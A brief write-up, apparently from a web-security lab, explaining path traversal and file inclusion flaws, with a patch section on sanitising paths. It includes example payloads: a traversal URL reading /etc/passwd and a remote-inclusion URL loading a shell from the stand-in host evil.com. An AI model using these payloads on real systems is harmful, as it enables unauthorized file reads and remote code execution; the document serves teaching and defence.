## Vulnerabilities Description :  

- Path Traversal : Manipulating file paths to access files (config files, sources code, logs...) outside the indented directory. 

	Ex: http://site.com?page=../../etc/passwd 


- File Inclusion : Abusing a file-include feature to get unauthorized locals files (LFI) or execute malicious external file (EFI).

	Ex: http://site.com?page=http://evil.com/shell.txt

These vulnerabilities are caused by unsanitized user inputs and/or lack of access control to resources.


## Exploit

-> add ?page=../../../../../../../<directory_name>/<file_name> into the URL search bar to get the file you want  
-> for example : http://site.com/index.php?page=../../../../../../../etc/passwd

## Patch

-> Sanitize correctly user input or not use user input directly in file paths.  
-> Resolve the real path and ensure it stays within an allowed directory.  
-> Can use a Whitelist-Based File Mapping  